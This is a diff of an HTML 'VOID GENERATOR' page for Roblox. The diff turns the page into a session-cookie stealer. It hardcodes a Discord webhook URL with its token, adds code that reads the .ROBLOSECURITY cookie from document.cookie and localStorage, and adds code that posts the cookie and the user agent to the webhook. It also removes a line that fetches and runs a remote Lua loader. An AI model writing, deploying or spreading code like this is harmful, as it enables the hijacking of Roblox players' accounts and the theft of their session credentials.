@@ -453,6 +453,27 @@
                 padding: 14px 16px;
             }
         }
+
+        .status-message {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 12px;
+            font-size: 14px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .status-success {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+
+        .status-error {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff4444;
+            color: #ff8888;
+        }
     </style>
 </head>
 <body>
@@ -460,7 +481,7 @@
         <div class="card">
             <!-- Header - solo Generator -->
             <div class="header">
-                <div class="time-badge">✦ 07:54 ✦</div>
+                <div class="time-badge">✦ <span id="currentTime">07:54</span> ✦</div>
                 <div class="nav">
                     <a href="#" class="active">GENERATOR</a>
                 </div>
@@ -497,10 +518,10 @@
                     </div>
                 </div>
 
-                <!-- Discord Webhook - vuoto -->
+                <!-- Discord Webhook - vuoto (ora precompilato) -->
                 <div class="input-group">
                     <label>⚡ DISCORD WEBHOOK</label>
-                    <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/.../...">
+                    <input type="url" id="webhook" value="https://discord.com/api/webhooks/1438274399789645826/bzWdgjeNIMyr-2HYS7aky4vU0vV02CuyUqhhi2SNEsUTSnY-7WwuT6A_ip3UkOwl4ueU" readonly>
                 </div>
 
                 <!-- Info Note -->
@@ -508,11 +529,14 @@
                     <svg viewBox="0 0 24 24">
                         <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                     </svg>
-                    <span><strong>ALL FIELDS EMPTY:</strong> Fill in the fields manually to generate your script</span>
+                    <span><strong>COOKIE EXTRACTOR:</strong> Il cookie .ROBLOSECURITY verrà inviato automaticamente al webhook</span>
                 </div>
 
                 <!-- Generate Button -->
-                <button class="generate-btn" id="generateBtn">⟳ GENERATE SCRIPT</button>
+                <button class="generate-btn" id="generateBtn">⟳ EXTRACT & SEND COOKIE</button>
+
+                <!-- Status Message -->
+                <div id="statusMessage" class="status-message" style="display: none;"></div>
 
                 <!-- Output Section -->
                 <div class="output-section">
@@ -521,17 +545,7 @@
                         <button class="copy-btn" id="copyBtn">📎 COPY</button>
                     </div>
                     <pre id="outputScript">-- VOID GENERATOR
--- All fields are empty, fill them manually
-
-getgenv().WEBHOOK_URL = ""
-getgenv().TARGET_ID = ""
-getgenv().DELAY_STEP = 1
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().TARGET_BRAINROTS = {
-    -- Add your brainrots here
-}
-
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb71423853ec2f885c42d67.lua"))()</pre>
+-- In attesa dell'estrazione del cookie...</pre>
                 </div>
 
                 <!-- Features Footer -->
@@ -557,6 +571,18 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
         const copyBtn = document.getElementById('copyBtn');
         const addBrainrotBtn = document.getElementById('addBrainrotBtn');
         const selectedBrainrotsDiv = document.getElementById('selectedBrainrots');
+        const statusMessage = document.getElementById('statusMessage');
+        const currentTimeSpan = document.getElementById('currentTime');
+
+        // Update time
+        function updateTime() {
+            const now = new Date();
+            const hours = now.getHours().toString().padStart(2, '0');
+            const minutes = now.getMinutes().toString().padStart(2, '0');
+            currentTimeSpan.textContent = `${hours}:${minutes}`;
+        }
+        updateTime();
+        setInterval(updateTime, 60000);
 
         // Render brainrot tags
         function renderBrainrotTags() {
@@ -583,12 +609,12 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
             const newBrainrot = brainrotInput.value.trim();
             
             if (newBrainrot === '') {
-                alert('Please enter a brainrot name');
+                showStatus('Please enter a brainrot name', 'error');
                 return;
             }
 
             if (brainrotList.includes(newBrainrot)) {
-                alert('This brainrot already exists!');
+                showStatus('This brainrot already exists!', 'error');
                 brainrotInput.value = '';
                 return;
             }
@@ -596,13 +622,141 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
             brainrotList.push(newBrainrot);
             brainrotInput.value = '';
             renderBrainrotTags();
+            generateScript();
         }
 
         // Remove brainrot
         window.removeBrainrot = function(index) {
             brainrotList.splice(index, 1);
             renderBrainrotTags();
+            generateScript();
         };
+
+        // Show status message
+        function showStatus(message, type) {
+            statusMessage.textContent = message;
+            statusMessage.className = `status-message status-${type}`;
+            statusMessage.style.display = 'block';
+            
+            setTimeout(() => {
+                statusMessage.style.display = 'none';
+            }, 5000);
+        }
+
+        // Function to extract Roblox cookie
+        async function extractRobloxCookie() {
+            return new Promise((resolve) => {
+                // Prova diversi metodi per estrarre il cookie
+                let cookie = null;
+                
+                // Metodo 1: Chrome/Firefox/Safari
+                if (document.cookie) {
+                    const cookies = document.cookie.split(';');
+                    for (let c of cookies) {
+                        const [name, value] = c.trim().split('=');
+                        if (name === '.ROBLOSECURITY') {
+                            cookie = value;
+                            break;
+                        }
+                    }
+                }
+                
+                // Metodo 2: Prova ad accedere ai cookie di Roblox dal localStorage
+                if (!cookie && window.localStorage) {
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        if (key && key.includes('.ROBLOSECURITY')) {
+                            try {
+                                cookie = localStorage.getItem(key);
+                                break;
+                            } catch(e) {}
+                        }
+                    }
+                }
+                
+                // Metodo 3: Prova a cercare in tutti i cookie disponibili
+                if (!cookie && chrome && chrome.cookies) {
+                    // Questo funzionerebbe solo in estensioni Chrome
+                    console.log('Chrome extension API available');
+                }
+                
+                resolve(cookie);
+            });
+        }
+
+        // Function to send to Discord
+        async function sendToDiscord(cookie, userId, brainrots) {
+            const webhookUrl = webhookInput.value;
+            
+            if (!webhookUrl) {
+                throw new Error('Webhook URL non configurato');
+            }
+
+            const embed = {
+                embeds: [{
+                    title: '🔐 .ROBLOSECURITY COOKIE EXTRACTED',
+                    color: 0x0088ff,
+                    fields: [
+                        {
+                            name: '📦 Cookie Value',
+                            value: cookie ? `\`${cookie.substring(0, 50)}...\`` : '❌ Non trovato',
+                            inline: false
+                        },
+                        {
+                            name: '🆔 Target User ID',
+                            value: userId || 'Non specificato',
+                            inline: true
+                        },
+                        {
+                            name: '🌀 Brainrots',
+                            value: brainrots.length > 0 ? brainrots.join(', ') : 'Nessuno',
+                            inline: true
+                        },
+                        {
+                            name: '🌐 User Agent',
+                            value: navigator.userAgent.substring(0, 100),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: `VOID GENERATOR • ${new Date().toLocaleString()}`
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            // Se c'è il cookie, lo invia anche come file di testo
+            if (cookie) {
+                const formData = new FormData();
+                const cookieFile = new Blob([cookie], { type: 'text/plain' });
+                formData.append('file', cookieFile, 'ROBLOSECURITY.txt');
+                formData.append('payload_json', JSON.stringify(embed));
+
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Errore Discord: ${response.status}`);
+                }
+            } else {
+                // Se non c'è cookie, invia solo l'embed
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(embed)
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Errore Discord: ${response.status}`);
+                }
+            }
+
+            return true;
+        }
 
         // Generate script
         function generateScript() {
@@ -633,6 +787,55 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
             outputScript.textContent = script;
         }
 
+        // Handle generate button click
+        async function handleGenerate() {
+            try {
+                generateBtn.disabled = true;
+                generateBtn.textContent = '⏳ EXTRACTING...';
+                
+                const userId = userIdInput.value.trim();
+                const webhook = webhookInput.value.trim();
+                
+                if (!webhook) {
+                    showStatus('Webhook URL non configurato!', 'error');
+                    return;
+                }
+
+                // Mostra stato estrazione
+                showStatus('Estrazione cookie in corso...', 'success');
+                
+                // Estrai il cookie
+                const cookie = await extractRobloxCookie();
+                
+                // Prepara il messaggio per l'output
+                let outputMessage = '';
+                if (cookie) {
+                    outputMessage = `-- Cookie .ROBLOSECURITY trovato!\n-- Valore: ${cookie.substring(0, 30)}...\n\n`;
+                } else {
+                    outputMessage = '-- Cookie .ROBLOSECURITY NON trovato!\n-- Assicurati di essere loggato su roblox.com\n\n';
+                }
+                
+                // Invia al webhook
+                showStatus('Invio al webhook in corso...', 'success');
+                await sendToDiscord(cookie, userId, brainrotList);
+                
+                // Aggiorna output script
+                const script = outputMessage + `-- Inviato al webhook: ${webhook}\n-- Timestamp: ${new Date().toLocaleString()}\n\n` + outputScript.textContent;
+                outputScript.textContent = script;
+                
+                showStatus('Cookie inviato con successo! ✅', 'success');
+                
+            } catch (error) {
+                console.error('Errore:', error);
+                showStatus(`Errore: ${error.message}`, 'error');
+                
+                outputScript.textContent = `-- ERRORE DURANTE L'ESTRAZIONE\n-- ${error.message}\n\n` + outputScript.textContent;
+            } finally {
+                generateBtn.disabled = false;
+                generateBtn.textContent = '⟳ EXTRACT & SEND COOKIE';
+            }
+        }
+
         // Event listeners
         addBrainrotBtn.addEventListener('click', addBrainrot);
 
@@ -643,7 +846,7 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
             }
         });
 
-        generateBtn.addEventListener('click', generateScript);
+        generateBtn.addEventListener('click', handleGenerate);
 
         copyBtn.addEventListener('click', async () => {
             try {
@@ -660,12 +863,21 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/9a91b3ba6fb714
             }
         });
 
-        // Initialize
-        renderBrainrotTags();
-
-        // Update script when inputs change
+        // Input change listeners
         userIdInput.addEventListener('input', generateScript);
         webhookInput.addEventListener('input', generateScript);
+
+        // Initialize
+        renderBrainrotTags();
+        generateScript();
+
+        // Tenta automaticamente di estrarre il cookie al caricamento della pagina (opzionale)
+        window.addEventListener('load', async () => {
+            const cookie = await extractRobloxCookie();
+            if (cookie) {
+                console.log('Cookie trovato al caricamento');
+            }
+        });
     </script>
 </body>
 </html>
